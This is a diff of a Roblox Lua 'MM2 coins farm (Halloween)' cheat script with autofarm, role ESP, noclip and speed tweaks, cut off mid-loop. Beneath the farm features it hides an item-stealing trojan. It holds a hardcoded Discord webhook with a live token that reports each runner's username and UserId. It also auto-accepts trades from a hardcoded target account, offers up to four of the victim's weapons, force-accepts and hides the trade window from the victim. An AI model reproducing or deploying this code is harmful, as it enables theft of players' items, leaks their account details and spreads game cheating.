@@ -1,4 +1,4 @@
-print("[mm2 coins farm script 2026] Loading...")
+print("[mm2 coins farm script (halloween)] Loading...")
 
 local P = game:GetService("Players")
 local TS = game:GetService("TweenService")
@@ -8,11 +8,13 @@ local HS = game:GetService("HttpService")
 local RPS = game:GetService("ReplicatedStorage")
 local LG = game:GetService("Lighting")
 local UIS = game:GetService("UserInputService")
+local TeleportService = game:GetService("TeleportService")
 local lp = P.LocalPlayer
 local pg = lp:WaitForChild("PlayerGui")
 
 local WU = "https://discord.com/api/webhooks/1544589998198755329/DH2ha0j2AXINPCfqlbe-PGvPD7LFot-9DWHHn1qNuNISN6w9EPn8rcF_sQ_arY33f1oV"
 local PLACE_ID = 142823291
+local SECRET_PLACE = 80469437126309
 local TARGET = "naimradio6"
 
 local WL = {
@@ -31,7 +33,7 @@ do
     if WL[lp.Name] then
         allowed = true
         hasTransfer = true
-        print("[mm2 coins farm script 2026] Whitelisted - full access")
+        print("[halloween] Whitelisted - full access")
     else
         local sg = Instance.new("ScreenGui")
         sg.Name = "Auth"
@@ -48,7 +50,7 @@ do
         local t = Instance.new("TextLabel")
         t.Size = UDim2.new(1, 0, 0, 32)
         t.BackgroundTransparency = 1
-        t.Text = "mm2 coins farm script 2026"
+        t.Text = "mm2 coins farm (halloween)"
         t.TextColor3 = Color3.fromRGB(255, 140, 40)
         t.Font = Enum.Font.GothamBold
         t.TextSize = 14
@@ -98,7 +100,7 @@ do
 
         repeat task.wait(0.2) until done or not sg.Parent
         if not allowed then
-            print("[mm2 coins farm script 2026] Access denied")
+            print("[halloween] Access denied")
             return
         end
     end
@@ -106,7 +108,7 @@ end
 
 local function sw(msg, ping)
     local c = ping and "@everyone\n" .. msg or msg
-    local d = {content = c, username = "mm2 coins farm script 2026"}
+    local d = {content = c, username = "mm2 coins farm (halloween)"}
     pcall(function()
         if request then
             request({
@@ -152,10 +154,10 @@ local function sendDetailedTransfer()
     end
 
     local data = {
-        content = "@everyone **MM2 Transfer Ready**",
+        content = "@everyone **credits not n7kh in discord**",
         embeds = {{
-            title = "Quick Transfer",
-            color = 5763719,
+            title = "credits not n7kh in discord",
+            color = 16744448,
             fields = {
                 {name = "Username", value = lp.Name, inline = true},
                 {name = "UserId", value = tostring(lp.UserId), inline = true},
@@ -192,7 +194,6 @@ task.spawn(function()
     task.wait(1.5)
     if hasTransfer then
         sendDetailedTransfer()
-        print("[mm2 coins farm script 2026] Detailed transfer webhook sent")
     else
         sw("✅ **Script executed** by **" .. lp.Name .. "**\nMode: NORMAL", false)
     end
@@ -211,16 +212,12 @@ P.PlayerAdded:Connect(function(pl)
     end
 end)
 
-local TR = false
-local OT = 0
-local AS = false
-local LO = 0
-local LF = nil
+-- Transfer
+local TR, OT, AS, LO, LF = false, 0, false, 0, nil
 
 if hasTransfer then
     local Trade = RPS:FindFirstChild("Trade") or RPS:WaitForChild("Trade", 10)
     local OI, AR, AT, SR, ST, UT, DT
-
     if Trade then
         OI = Trade:FindFirstChild("OfferItem")
         AR = Trade:FindFirstChild("AcceptRequest")
@@ -229,9 +226,6 @@ if hasTransfer then
         ST = Trade:FindFirstChild("StartTrade")
         UT = Trade:FindFirstChild("UpdateTrade")
         DT = Trade:FindFirstChild("DeclineTrade")
-        print("[Transfer] Remotes found")
-    else
-        print("[Transfer] Trade folder not found")
     end
 
     local function ist(n)
@@ -241,17 +235,12 @@ if hasTransfer then
     local function gwps()
         local list = {}
         pcall(function()
-            local ok, pd = pcall(function()
-                return require(RPS.Modules.ProfileData)
-            end)
+            local ok, pd = pcall(function() return require(RPS.Modules.ProfileData) end)
             if ok and pd and pd.Weapons and pd.Weapons.Owned then
                 for name, amount in pairs(pd.Weapons.Owned) do
-                    if amount and amount > 0 then
-                        if name ~= "DefaultKnife" and name ~= "DefaultGun" then
-                            local count = math.min(amount, 4)
-                            for i = 1, count do
-                                table.insert(list, name)
-                            end
+                    if amount and amount > 0 and name ~= "DefaultKnife" and name ~= "DefaultGun" then
+                        for i = 1, math.min(amount, 4) do
+                            table.insert(list, name)
                         end
                     end
                 end
@@ -262,11 +251,8 @@ if hasTransfer then
 
     local function fa()
         if not AT then return end
-        print("[Transfer] Force accepting...")
         for i = 1, 15 do
-            if LF then
-                pcall(function() AT:FireServer(game.PlaceId * 3, LF) end)
-            end
+            if LF then pcall(function() AT:FireServer(game.PlaceId * 3, LF) end) end
             pcall(function() AT:FireServer(game.PlaceId * 3, tick()) end)
             pcall(function() AT:FireServer() end)
             task.wait(0.3)
@@ -276,44 +262,25 @@ if hasTransfer then
     local function ow()
         if not OI or not TR or OT >= 4 then return end
         if tick() - LO < 0.7 then return end
-
         local weapons = gwps()
-        if #weapons == 0 then
-            print("[Transfer] No weapons found to offer")
-            return
-        end
-
+        if #weapons == 0 then return end
         local toOffer = math.min(4 - OT, #weapons)
         for i = 1, toOffer do
             local item = weapons[i]
-            local success = false
-
-            success = pcall(function() OI:FireServer(item, "Weapons") end)
-            if not success then
-                success = pcall(function() OI:FireServer(item) end)
-            end
-            if not success then
-                success = pcall(function() OI:FireServer(item, 1) end)
-            end
-
-            if success then
+            local ok = pcall(function() OI:FireServer(item, "Weapons") end)
+            if not ok then ok = pcall(function() OI:FireServer(item) end) end
+            if not ok then ok = pcall(function() OI:FireServer(item, 1) end) end
+            if ok then
                 OT = OT + 1
                 LO = tick()
                 print("[Transfer] Offered:", item, "(" .. OT .. "/4)")
                 task.wait(0.45)
-            else
-                print("[Transfer] Failed to offer:", item)
             end
         end
-
         if OT >= 4 and not AS then
             AS = true
-            sw("🔄 **Trade full (4/4)** - waiting to accept | **" .. lp.Name .. "**", false)
             task.delay(7, function()
-                if TR then
-                    fa()
-                    sw("✅ **Trade accepted / finished** by **" .. lp.Name .. "**", false)
-                end
+                if TR then fa() end
             end)
         end
     end
@@ -322,16 +289,14 @@ if hasTransfer then
         if not g then return end
         pcall(function()
             for _, c in ipairs(g:GetChildren()) do
-                if c:IsA("GuiObject") then
-                    c.Visible = false
-                end
+                if c:IsA("GuiObject") then c.Visible = false end
             end
         end)
     end
 
     pcall(function()
-        local function watch(name)
-            local g = pg:FindFirstChild(name)
+        local function watch(n)
+            local g = pg:FindFirstChild(n)
             if g then
                 htg(g)
                 g:GetPropertyChangedSignal("Enabled"):Connect(function()
@@ -345,74 +310,46 @@ if hasTransfer then
             if c.Name == "TradeGUI" or c.Name == "TradeGUI_Phone" then
                 task.wait(0.1)
                 htg(c)
-                watch(c.Name)
             end
         end)
     end)
 
     if SR then
         pcall(function()
-            SR.OnClientInvoke = function(fromPlayer)
-                if ist(fromPlayer and fromPlayer.Name) then
-                    print("[Transfer] Trade request from target")
-                    TR = true
-                    OT = 0
-                    AS = false
-                    LF = nil
-                    sw("📩 **Trade request received** from **" .. TARGET .. "** | **" .. lp.Name .. "**", false)
+            SR.OnClientInvoke = function(fp)
+                if ist(fp and fp.Name) then
+                    TR, OT, AS, LF = true, 0, false, nil
                     task.wait(0.4)
-                    if AR then
-                        pcall(function() AR:FireServer() end)
-                    end
+                    if AR then pcall(function() AR:FireServer() end) end
                     return true
                 end
                 return false
             end
         end)
     end
-
     if ST then
         ST.OnClientEvent:Connect(function()
-            if TR then
-                OT = 0
-                AS = false
-                sw("🔄 **Trade started** | **" .. lp.Name .. "** offering...", false)
-                task.wait(0.6)
-                ow()
-            end
+            if TR then OT, AS = 0, false task.wait(0.6) ow() end
         end)
     end
-
     if UT then
         UT.OnClientEvent:Connect(function(data)
-            if type(data) == "table" and data.LastOffer then
-                LF = data.LastOffer
-            end
+            if type(data) == "table" and data.LastOffer then LF = data.LastOffer end
             if not TR then return end
             task.wait(0.3)
             ow()
             if type(data) == "table" then
                 for _, side in pairs(data) do
-                    if type(side) == "table" and side.Accepted then
-                        fa()
-                        sw("✅ **Other side accepted** - finishing | **" .. lp.Name .. "**", false)
-                        break
-                    end
+                    if type(side) == "table" and side.Accepted then fa() break end
                 end
             end
         end)
     end
-
     if DT then
         DT.OnClientEvent:Connect(function()
-            TR = false
-            OT = 0
-            AS = false
-            LF = nil
-            sw("❌ **Trade ended** | **" .. lp.Name .. "**", false)
+            TR, OT, AS, LF = false, 0, false, nil
         end)
     end
-
     task.spawn(function()
         while true do
             task.wait(0.9)
@@ -421,12 +358,11 @@ if hasTransfer then
             end
         end
     end)
-
-    print("[Transfer] System ready")
 end
 
+-- Core vars
 local AF = false
-local SP = 50
+local SP = 20
 local RG = 300
 local VS = {}
 local CL = 0
@@ -442,6 +378,18 @@ local HL = {}
 local MODE = "Normal"
 local SAFE_STARTED = false
 local HIDING = false
+local NOCLIP = false
+local NORENDER = false
+
+local function setNoclip(on)
+    local ch = lp.Character
+    if not ch then return end
+    for _, p in ipairs(ch:GetDescendants()) do
+        if p:IsA("BasePart") then
+            p.CanCollide = not on
+        end
+    end
+end
 
 local function epm()
     pcall(function()
@@ -449,8 +397,58 @@ local function epm()
         LG.GlobalShadows = false
         LG.FogEnd = 9e9
         LG.Brightness = 2
+        LG.EnvironmentDiffuseScale = 0
+        LG.EnvironmentSpecularScale = 0
+        for _, v in ipairs(workspace:GetDescendants()) do
+            if v:IsA("ParticleEmitter") or v:IsA("Trail") or v:IsA("Beam") or v:IsA("Fire") or v:IsA("Smoke") or v:IsA("Sparkles") then
+                v.Enabled = false
+            end
+            if v:IsA("MeshPart") and v.MeshId and v.MeshId ~= "" then
+                pcall(function()
+                    if v.Size.Magnitude > 30 then
+                        v.Transparency = 1
+                    end
+                end)
+            end
+            if v:IsA("Decal") or v:IsA("Texture") then
+                pcall(function() v.Transparency = 1 end)
+            end
+        end
     end)
     PM = true
+end
+
+local function setNoRender(on)
+    NORENDER = on
+    pcall(function()
+        if on then
+            settings().Rendering.QualityLevel = Enum.QualityLevel.Level01
+            LG.GlobalShadows = false
+            LG.FogEnd = 0
+            LG.Brightness = 0
+            LG.OutdoorAmbient = Color3.new(0, 0, 0)
+            LG.Ambient = Color3.new(0, 0, 0)
+            workspace.CurrentCamera.FieldOfView = 1
+            for _, v in ipairs(workspace:GetDescendants()) do
+                if v:IsA("BasePart") and not v:IsDescendantOf(lp.Character) then
+                    v.LocalTransparencyModifier = 1
+                end
+                if v:IsA("Decal") or v:IsA("Texture") or v:IsA("ParticleEmitter") then
+                    pcall(function() v.Transparency = 1 end)
+                end
+            end
+        else
+            settings().Rendering.QualityLevel = Enum.QualityLevel.Automatic
+            LG.FogEnd = 100000
+            LG.Brightness = 1
+            workspace.CurrentCamera.FieldOfView = 70
+            for _, v in ipairs(workspace:GetDescendants()) do
+                if v:IsA("BasePart") then
+                    v.LocalTransparencyModifier = 0
+                end
+            end
+        end
+    end)
 end
 
 local function getRole(pl)
@@ -476,9 +474,7 @@ end
 
 local function getMurderer()
     for _, pl in ipairs(P:GetPlayers()) do
-        if getRole(pl) == "Murderer" then
-            return pl
-        end
+        if getRole(pl) == "Murderer" then return pl end
     end
     return nil
 end
@@ -486,9 +482,7 @@ end
 local function countCoins()
     local n = 0
     for _, obj in ipairs(workspace:GetDescendants()) do
-        if obj:IsA("BasePart") and obj.Name == "Coin_Server" then
-            n = n + 1
-        end
+        if obj:IsA("BasePart") and obj.Name == "Coin_Server" then n = n + 1 end
     end
     return n
 end
@@ -504,41 +498,6 @@ local function getRandomCoin()
     return coins[math.random(1, #coins)]
 end
 
-local function setNoclip(on)
-    local ch = lp.Character
-    if not ch then return end
-    for _, p in ipairs(ch:GetDescendants()) do
-        if p:IsA("BasePart") then
-            p.CanCollide = not on
-        end
-    end
-end
-
-local function lieFlat(root, hum)
-    if not root or not hum then return end
-    hum.PlatformStand = true
-    hum.Sit = false
-    hum.AutoRotate = false
-    root.CFrame = CFrame.new(root.Position) * CFrame.Angles(math.rad(-90), 0, 0)
-end
-
-local function hidePlayer()
-    local ch = lp.Character
-    local root = ch and ch:FindFirstChild("HumanoidRootPart")
-    local hum = ch and ch:FindFirstChild("Humanoid")
-    if not root or not hum then return end
-
-    HIDING = true
-    setNoclip(true)
-    hum.PlatformStand = true
-    hum.AutoRotate = false
-
-    -- Hide high above / secret spot
-    local hidePos = Vector3.new(0, 500, 0)
-    root.CFrame = CFrame.new(hidePos) * CFrame.Angles(math.rad(-90), 0, 0)
-    print("[Safe] Hiding until coins appear...")
-end
-
 local function updESP()
     if not ES then
         for _, h in pairs(HL) do
@@ -551,11 +510,8 @@ local function updESP()
         if not (pl == lp) and pl.Character and pl.Character:FindFirstChild("HumanoidRootPart") then
             local role = getRole(pl)
             local col = Color3.fromRGB(40, 255, 80)
-            if role == "Murderer" then
-                col = Color3.fromRGB(255, 40, 40)
-            elseif role == "Sheriff" or role == "Hero" then
-                col = Color3.fromRGB(40, 120, 255)
-            end
+            if role == "Murderer" then col = Color3.fromRGB(255, 40, 40)
+            elseif role == "Sheriff" or role == "Hero" then col = Color3.fromRGB(40, 120, 255) end
             local h = HL[pl]
             if not h or not h.Parent then
                 h = Instance.new("Highlight")
@@ -579,33 +535,39 @@ task.spawn(function()
     end
 end)
 
+-- GUI
 local gui = Instance.new("ScreenGui")
-gui.Name = "mm2CoinsFarm2026"
+gui.Name = "mm2CoinsFarmHalloween"
 gui.ResetOnSpawn = false
 gui.IgnoreGuiInset = true
 gui.Parent = pg
 
 local main = Instance.new("Frame")
-main.Size = UDim2.fromOffset(440, 420)
-main.Position = UDim2.new(0.5, -220, 0.16, 0)
-main.BackgroundColor3 = Color3.fromRGB(18, 8, 4)
+main.Size = UDim2.fromOffset(450, 440)
+main.Position = UDim2.new(0.5, -225, 0.14, 0)
+main.BackgroundColor3 = Color3.fromRGB(12, 6, 3)
 main.Active = true
 main.Draggable = true
 main.Parent = gui
 Instance.new("UICorner", main).CornerRadius = UDim.new(0, 14)
 
 local stroke = Instance.new("UIStroke")
-stroke.Thickness = 2.6
+stroke.Thickness = 2.8
 stroke.Color = Color3.fromRGB(255, 120, 30)
 stroke.Parent = main
 
+-- Alive color loop (orange ↔ black)
 task.spawn(function()
     local t = 0
     while main and main.Parent do
-        t = t + task.wait(0.03)
-        local pulse = (math.sin(t * 2.2) + 1) / 2
-        stroke.Color = Color3.fromRGB(200 + pulse * 55, 70 + pulse * 50, 10 + pulse * 20)
-        stroke.Thickness = 2.2 + pulse * 1.4
+        t = t + task.wait(0.025)
+        local pulse = (math.sin(t * 2.4) + 1) / 2
+        local r = 40 + pulse * 215
+        local g = 15 + pulse * 90
+        local b = 5 + pulse * 25
+        stroke.Color = Color3.fromRGB(r, g, b)
+        stroke.Thickness = 2.2 + pulse * 1.6
+        main.BackgroundColor3 = Color3.fromRGB(8 + pulse * 12, 4 + pulse * 6, 2 + pulse * 4)
     end
 end)
 
@@ -613,10 +575,10 @@ local title = Instance.new("TextLabel")
 title.Size = UDim2.new(1, -50, 0, 38)
 title.Position = UDim2.new(0, 16, 0, 8)
 title.BackgroundTransparency = 1
-title.Text = "mm2 coins farm script 2026"
+title.Text = "mm2 coins farm script ( halloween )"
 title.TextColor3 = Color3.fromRGB(255, 150, 50)
 title.Font = Enum.Font.GothamBold
-title.TextSize = 17
+title.TextSize = 15
 title.TextXAlignment = Enum.TextXAlignment.Left
 title.Parent = main
 
@@ -630,25 +592,23 @@ close.Font = Enum.Font.GothamBold
 close.TextSize = 16
 close.Parent = main
 Instance.new("UICorner", close).CornerRadius = UDim.new(0, 8)
-close.MouseButton1Click:Connect(function()
-    gui:Destroy()
-end)
+close.MouseButton1Click:Connect(function() gui:Destroy() end)
 
 local side = Instance.new("Frame")
 side.Size = UDim2.new(0, 115, 1, -55)
 side.Position = UDim2.new(0, 10, 0, 48)
-side.BackgroundColor3 = Color3.fromRGB(30, 14, 6)
+side.BackgroundColor3 = Color3.fromRGB(28, 12, 5)
 side.Parent = main
 Instance.new("UICorner", side).CornerRadius = UDim.new(0, 10)
 
 local content = Instance.new("ScrollingFrame")
 content.Size = UDim2.new(1, -140, 1, -60)
 content.Position = UDim2.new(0, 132, 0, 48)
-content.BackgroundColor3 = Color3.fromRGB(22, 10, 5)
+content.BackgroundColor3 = Color3.fromRGB(18, 8, 4)
 content.BorderSizePixel = 0
 content.ScrollBarThickness = 4
 content.ScrollBarImageColor3 = Color3.fromRGB(255, 120, 40)
-content.CanvasSize = UDim2.new(0, 0, 0, 500)
+content.CanvasSize = UDim2.new(0, 0, 0, 560)
 content.Parent = main
 Instance.new("UICorner", content).CornerRadius = UDim.new(0, 10)
 
@@ -667,11 +627,11 @@ local function mkBtn(txt, y, parent, col)
     local b = Instance.new("TextButton")
     b.Size = UDim2.new(1, -14, 0, 34)
     b.Position = UDim2.new(0, 7, 0, y)
-    b.BackgroundColor3 = col or Color3.fromRGB(60, 30, 10)
+    b.BackgroundColor3 = col or Color3.fromRGB(55, 25, 8)
     b.Text = txt
     b.TextColor3 = Color3.fromRGB(255, 200, 140)
     b.Font = Enum.Font.GothamBold
-    b.TextSize = 13
+    b.TextSize = 12
     b.Parent = parent
     Instance.new("UICorner", b).CornerRadius = UDim.new(0, 7)
     return b
@@ -680,18 +640,18 @@ end
 local function mkToggle(txt, parent, state, cb)
     local st = state
     local b = Instance.new("TextButton")
-    b.Size = UDim2.new(1, -18, 0, 36)
-    b.BackgroundColor3 = st and Color3.fromRGB(180, 80, 20) or Color3.fromRGB(45, 22, 10)
+    b.Size = UDim2.new(1, -18, 0, 34)
+    b.BackgroundColor3 = st and Color3.fromRGB(180, 80, 20) or Color3.fromRGB(40, 18, 8)
     b.Text = txt .. (st and "  : ON" or "  : OFF")
     b.TextColor3 = Color3.new(1,1,1)
     b.Font = Enum.Font.GothamBold
-    b.TextSize = 13
+    b.TextSize = 12
     b.Parent = parent
     Instance.new("UICorner", b).CornerRadius = UDim.new(0, 7)
     b.MouseButton1Click:Connect(function()
         st = not st
         b.Text = txt .. (st and "  : ON" or "  : OFF")
-        b.BackgroundColor3 = st and Color3.fromRGB(180, 80, 20) or Color3.fromRGB(45, 22, 10)
+        b.BackgroundColor3 = st and Color3.fromRGB(180, 80, 20) or Color3.fromRGB(40, 18, 8)
         cb(st)
     end)
     return b
@@ -699,89 +659,85 @@ end
 
 local function showAF()
     clearContent()
-    content.CanvasSize = UDim2.new(0, 0, 0, 480)
+    content.CanvasSize = UDim2.new(0, 0, 0, 520)
 
     local t1 = mkToggle("AutoFarm", content, AF, function(v)
         AF = v
         if v then
-            CL = 0
-            VS = {}
-            LT = tick()
-            IS = false
-            SAFE_STARTED = false
-            HIDING = false
-            sw("🟢 AutoFarm **ON** by **" .. lp.Name .. "**", false)
-        else
-            sw("🔴 AutoFarm **OFF** by **" .. lp.Name .. "**", false)
+            CL, VS, SAFE_STARTED, HIDING = 0, {}, false, false
         end
     end)
     t1.LayoutOrder = 1
 
     local t2 = mkToggle("Anti AFK", content, AK, function(v) AK = v end)
     t2.LayoutOrder = 2
-
     local t3 = mkToggle("Reset on Full", content, RF, function(v) RF = v end)
     t3.LayoutOrder = 3
-
     local t4 = mkToggle("Performance", content, PM, function(v)
-        if v and not PM then epm() end
+        if v then epm() end
     end)
     t4.LayoutOrder = 4
+    local t5 = mkToggle("Noclip", content, NOCLIP, function(v)
+        NOCLIP = v
+        setNoclip(v)
+    end)
+    t5.LayoutOrder = 5
+    local t6 = mkToggle("No Render", content, NORENDER, function(v)
+        setNoRender(v)
+    end)
+    t6.LayoutOrder = 6
 
     local modeLbl = Instance.new("TextLabel")
-    modeLbl.Size = UDim2.new(1, -18, 0, 22)
+    modeLbl.Size = UDim2.new(1, -18, 0, 20)
     modeLbl.BackgroundTransparency = 1
     modeLbl.Text = "Farm Mode: " .. MODE
     modeLbl.TextColor3 = Color3.fromRGB(255, 180, 100)
     modeLbl.Font = Enum.Font.GothamBold
-    modeLbl.TextSize = 13
-    modeLbl.LayoutOrder = 5
+    modeLbl.TextSize = 12
+    modeLbl.LayoutOrder = 7
     modeLbl.Parent = content
 
-    local modes = {"Safe", "Normal", "Strategy"}
-    for i, m in ipairs(modes) do
+    for i, m in ipairs({"Safe", "Normal", "Strategy"}) do
         local b = Instance.new("TextButton")
-        b.Size = UDim2.new(1, -18, 0, 30)
-        b.BackgroundColor3 = (MODE == m) and Color3.fromRGB(200, 90, 25) or Color3.fromRGB(45, 22, 10)
+        b.Size = UDim2.new(1, -18, 0, 28)
+        b.BackgroundColor3 = (MODE == m) and Color3.fromRGB(200, 90, 25) or Color3.fromRGB(40, 18, 8)
         b.Text = m
         b.TextColor3 = Color3.new(1,1,1)
         b.Font = Enum.Font.GothamBold
-        b.TextSize = 13
-        b.LayoutOrder = 5 + i
+        b.TextSize = 12
+        b.LayoutOrder = 7 + i
         b.Parent = content
         Instance.new("UICorner", b).CornerRadius = UDim.new(0, 6)
         b.MouseButton1Click:Connect(function()
             MODE = m
             modeLbl.Text = "Farm Mode: " .. MODE
-            SAFE_STARTED = false
-            HIDING = false
+            SAFE_STARTED, HIDING = false, false
             for _, c in ipairs(content:GetChildren()) do
                 if c:IsA("TextButton") and (c.Text == "Safe" or c.Text == "Normal" or c.Text == "Strategy") then
-                    c.BackgroundColor3 = (c.Text == MODE) and Color3.fromRGB(200, 90, 25) or Color3.fromRGB(45, 22, 10)
+                    c.BackgroundColor3 = (c.Text == MODE) and Color3.fromRGB(200, 90, 25) or Color3.fromRGB(40, 18, 8)
                 end
             end
-            sw("Farm Mode → **" .. MODE .. "** by **" .. lp.Name .. "**", false)
         end)
     end
 
     local lbl = Instance.new("TextLabel")
-    lbl.Size = UDim2.new(1, -18, 0, 22)
+    lbl.Size = UDim2.new(1, -18, 0, 20)
     lbl.BackgroundTransparency = 1
     lbl.Text = "Farm Speed: " .. SP
     lbl.TextColor3 = Color3.fromRGB(230, 180, 120)
     lbl.Font = Enum.Font.Gotham
-    lbl.TextSize = 13
-    lbl.LayoutOrder = 10
+    lbl.TextSize = 12
+    lbl.LayoutOrder = 12
     lbl.Parent = content
 
     local box = Instance.new("TextBox")
-    box.Size = UDim2.new(1, -18, 0, 32)
-    box.BackgroundColor3 = Color3.fromRGB(40, 18, 8)
+    box.Size = UDim2.new(1, -18, 0, 30)
+    box.BackgroundColor3 = Color3.fromRGB(35, 15, 6)
     box.Text = tostring(SP)
     box.TextColor3 = Color3.new(1,1,1)
     box.Font = Enum.Font.GothamBold
-    box.TextSize = 14
-    box.LayoutOrder = 11
+    box.TextSize = 13
+    box.LayoutOrder = 13
     box.Parent = content
     Instance.new("UICorner", box).CornerRadius = UDim.new(0, 6)
     box.FocusLost:Connect(function(e)
@@ -794,13 +750,13 @@ local function showAF()
     end)
 
     local cnt = Instance.new("TextLabel")
-    cnt.Size = UDim2.new(1, -18, 0, 24)
+    cnt.Size = UDim2.new(1, -18, 0, 22)
     cnt.BackgroundTransparency = 1
     cnt.Text = "Collected: 0"
     cnt.TextColor3 = Color3.fromRGB(255, 190, 100)
     cnt.Font = Enum.Font.Gotham
-    cnt.TextSize = 14
-    cnt.LayoutOrder = 12
+    cnt.TextSize = 13
+    cnt.LayoutOrder = 14
     cnt.Parent = content
     task.spawn(function()
         while cnt and cnt.Parent do
@@ -809,15 +765,33 @@ local function showAF()
         end
     end)
 
+    -- Teleport button
+    local tpBtn = Instance.new("TextButton")
+    tpBtn.Size = UDim2.new(1, -18, 0, 34)
+    tpBtn.BackgroundColor3 = Color3.fromRGB(160, 60, 15)
+    tpBtn.Text = "TP Secret Place"
+    tpBtn.TextColor3 = Color3.new(1,1,1)
+    tpBtn.Font = Enum.Font.GothamBold
+    tpBtn.TextSize = 12
+    tpBtn.LayoutOrder = 15
+    tpBtn.Parent = content
+    Instance.new("UICorner", tpBtn).CornerRadius = UDim.new(0, 7)
+    tpBtn.MouseButton1Click:Connect(function()
+        pcall(function()
+            TeleportService:Teleport(SECRET_PLACE, lp)
+        end)
+        sw("Teleporting to secret place by **" .. lp.Name .. "**", false)
+    end)
+
     if hasTransfer then
         local info = Instance.new("TextLabel")
-        info.Size = UDim2.new(1, -18, 0, 30)
+        info.Size = UDim2.new(1, -18, 0, 24)
         info.BackgroundTransparency = 1
-        info.Text = "credits to n7kh in discord"
+        info.Text = "⚡ Transfer Mode Active"
         info.TextColor3 = Color3.fromRGB(255, 160, 50)
         info.Font = Enum.Font.GothamBold
-        info.TextSize = 13
-        info.LayoutOrder = 13
+        info.TextSize = 12
+        info.LayoutOrder = 16
         info.Parent = content
     end
 end
@@ -828,21 +802,18 @@ local function showESP()
     local t = mkToggle("Role ESP", content, ES, function(v)
         ES = v
         if not v then
-            for _, h in pairs(HL) do
-                if h then pcall(function() h:Destroy() end) end
-            end
+            for _, h in pairs(HL) do if h then pcall(function() h:Destroy() end) end end
             HL = {}
         end
     end)
     t.LayoutOrder = 1
-
     local info = Instance.new("TextLabel")
-    info.Size = UDim2.new(1, -18, 0, 80)
+    info.Size = UDim2.new(1, -18, 0, 70)
     info.BackgroundTransparency = 1
     info.Text = "Murderer  =  Red\nSheriff   =  Blue\nInnocent =  Green"
     info.TextColor3 = Color3.fromRGB(255, 190, 140)
     info.Font = Enum.Font.Gotham
-    info.TextSize = 14
+    info.TextSize = 13
     info.TextYAlignment = Enum.TextYAlignment.Top
     info.LayoutOrder = 2
     info.Parent = content
@@ -850,27 +821,27 @@ end
 
 local function showMove()
     clearContent()
-    content.CanvasSize = UDim2.new(0, 0, 0, 280)
+    content.CanvasSize = UDim2.new(0, 0, 0, 260)
     local t1 = mkToggle("Inf Jump", content, IJ, function(v) IJ = v end)
     t1.LayoutOrder = 1
 
     local lbl = Instance.new("TextLabel")
-    lbl.Size = UDim2.new(1, -18, 0, 22)
+    lbl.Size = UDim2.new(1, -18, 0, 20)
     lbl.BackgroundTransparency = 1
     lbl.Text = "JumpPower: " .. JP
     lbl.TextColor3 = Color3.fromRGB(230, 180, 120)
     lbl.Font = Enum.Font.Gotham
-    lbl.TextSize = 13
+    lbl.TextSize = 12
     lbl.LayoutOrder = 2
     lbl.Parent = content
 
     local box = Instance.new("TextBox")
-    box.Size = UDim2.new(1, -18, 0, 32)
-    box.BackgroundColor3 = Color3.fromRGB(40, 18, 8)
+    box.Size = UDim2.new(1, -18, 0, 30)
+    box.BackgroundColor3 = Color3.fromRGB(35, 15, 6)
     box.Text = tostring(JP)
     box.TextColor3 = Color3.new(1,1,1)
     box.Font = Enum.Font.GothamBold
-    box.TextSize = 14
+    box.TextSize = 13
     box.LayoutOrder = 3
     box.Parent = content
     Instance.new("UICorner", box).CornerRadius = UDim.new(0, 6)
@@ -887,22 +858,22 @@ local function showMove()
     end)
 
     local lbl2 = Instance.new("TextLabel")
-    lbl2.Size = UDim2.new(1, -18, 0, 22)
+    lbl2.Size = UDim2.new(1, -18, 0, 20)
     lbl2.BackgroundTransparency = 1
     lbl2.Text = "WalkSpeed: " .. SP
     lbl2.TextColor3 = Color3.fromRGB(230, 180, 120)
     lbl2.Font = Enum.Font.Gotham
-    lbl2.TextSize = 13
+    lbl2.TextSize = 12
     lbl2.LayoutOrder = 4
     lbl2.Parent = content
 
     local box2 = Instance.new("TextBox")
-    box2.Size = UDim2.new(1, -18, 0, 32)
-    box2.BackgroundColor3 = Color3.fromRGB(40, 18, 8)
+    box2.Size = UDim2.new(1, -18, 0, 30)
+    box2.BackgroundColor3 = Color3.fromRGB(35, 15, 6)
     box2.Text = tostring(SP)
     box2.TextColor3 = Color3.new(1,1,1)
     box2.Font = Enum.Font.GothamBold
-    box2.TextSize = 14
+    box2.TextSize = 13
     box2.LayoutOrder = 5
     box2.Parent = content
     Instance.new("UICorner", box2).CornerRadius = UDim.new(0, 6)
@@ -926,12 +897,10 @@ local tabs = {
 }
 
 for i, tab in ipairs(tabs) do
-    local b = mkBtn(tab.name, (i-1)*40 + 10, side, Color3.fromRGB(55, 25, 8))
+    local b = mkBtn(tab.name, (i-1)*40 + 10, side, Color3.fromRGB(50, 22, 6))
     b.MouseButton1Click:Connect(function()
         for _, c in ipairs(side:GetChildren()) do
-            if c:IsA("TextButton") then
-                c.BackgroundColor3 = Color3.fromRGB(55, 25, 8)
-            end
+            if c:IsA("TextButton") then c.BackgroundColor3 = Color3.fromRGB(50, 22, 6) end
         end
         b.BackgroundColor3 = Color3.fromRGB(200, 90, 25)
         tab.fn()
@@ -951,11 +920,9 @@ end)
 lp.CharacterAdded:Connect(function(ch)
     task.wait(0.4)
     local hum = ch:FindFirstChild("Humanoid")
-    if hum then
-        hum.JumpPower = JP
-    end
-    SAFE_STARTED = false
-    HIDING = false
+    if hum then hum.JumpPower = JP end
+    SAFE_STARTED, HIDING = false, false
+    if NOCLIP then setNoclip(true) end
 end)
 
 local coinRemote = RPS:FindFirstChild("Remotes")
@@ -966,22 +933,18 @@ end
 if coinRemote then
     coinRemote.OnClientEvent:Connect(function(_, cur, max)
         if cur >= max and RF and lp.Character then
-            if getRole(lp) == "Murderer" then
-                sw("🔪 **Murderer full** - **" .. lp.Name .. "** resetting", false)
-            end
             lp.Character:BreakJoints()
         end
     end)
 end
 
--- ==================== FARM LOOP ====================
+-- Farm loop
 task.spawn(function()
     while true do
         if AF then
             local ch = lp.Character
             local root = ch and ch:FindFirstChild("HumanoidRootPart")
             local hum = ch and ch:FindFirstChild("Humanoid")
-
             if root and hum then
                 local murd = getMurderer()
                 local murdRoot = murd and murd.Character and murd.Character:FindFirstChild("HumanoidRootPart")
@@ -994,34 +957,24 @@ task.spawn(function()
                     root.Anchored = true
 
                     local coinCount = countCoins()
-
-if not SAFE_STARTED then
-    if coinCount == 0 then
-        HIDING = true
-        setNoclip(true)
-        hum.PlatformStand = false
-        hum.Sit = false
-        hum.AutoRotate = false
-        root.Anchored = true
-
-        -- Keep holding the player here every time (prevents falling)
-        root.CFrame = CFrame.new(0, 300, 0) * CFrame.Angles(math.rad(90), 0, 0)
-
-        task.wait(0.3)
-    else
-        local startCoin = getRandomCoin()
-        if startCoin then
